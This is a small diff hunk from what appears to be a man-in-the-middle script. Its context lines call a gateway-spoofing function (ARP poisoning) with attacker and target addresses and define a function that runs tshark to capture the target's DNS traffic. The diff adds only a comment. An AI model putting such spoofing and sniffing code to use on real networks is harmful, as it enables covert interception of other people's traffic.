@@ -30,6 +30,8 @@ total1 = fct.spoof_gateway(gateway_ip,target_ip,attacker_mac,gateway_mac)
 
 print("[***] Sniffing of the DNS packets [***]\n")
 
+
+#HERE THE SNIFFING COMMAND !! :D
 def shell_sniff():
         os.system('tshark -f "host <ADRESS IP TARGET>" | grep DNS')
 
